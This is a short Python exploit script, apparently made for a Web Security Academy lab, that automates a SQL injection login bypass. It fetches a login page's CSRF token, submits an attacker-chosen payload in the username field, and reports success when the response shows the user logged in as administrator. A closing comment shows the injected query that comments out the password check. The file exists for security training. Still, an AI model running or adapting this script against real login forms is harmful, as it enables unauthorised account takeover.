#  SQL injection vulnerability allowing login bypass

import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup #pip install beautifulsoup4



proxies = {'http': 'http://127.0.0.1:8080','https': 'http://127.0.0.1:8080' }

# url = 'https://0a66009f030532aa80fdd1e600590001.web-security-academy.net/login'

def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")['value']
    print(csrf)
    return csrf

def exploit_sqli(s, url, payload):
    csrf = get_csrf_token(s, url)
    # data: csrf=KJncC4sT6MhH4GiO1Iy78HhKuh7QqkCm&username=admin&password=amdd
    data = {
        "csrf": csrf,
        "username": payload,
        "password": "randomtext"
    }
    r = s.post(url, data = data, verify=False, proxies=proxies)
    res = r.text
    if "Log out" in res:
        return True
    else:
        return False


if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
        sqli_payload = sys.argv[2].strip()
    except IndexError:
        print ("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print ('[-] Example: %s www.example.com "1=1"' % sys.argv[0])

    s = requests.Session()

    if exploit_sqli(s, url, sqli_payload):
        print("[+] SQL injection successful! We have logged in as administrators")
    else:
        print("[-] SQL injection failed")

# SELECT * FROM users WHERE username = 'administrator'--' and password = 'admin'
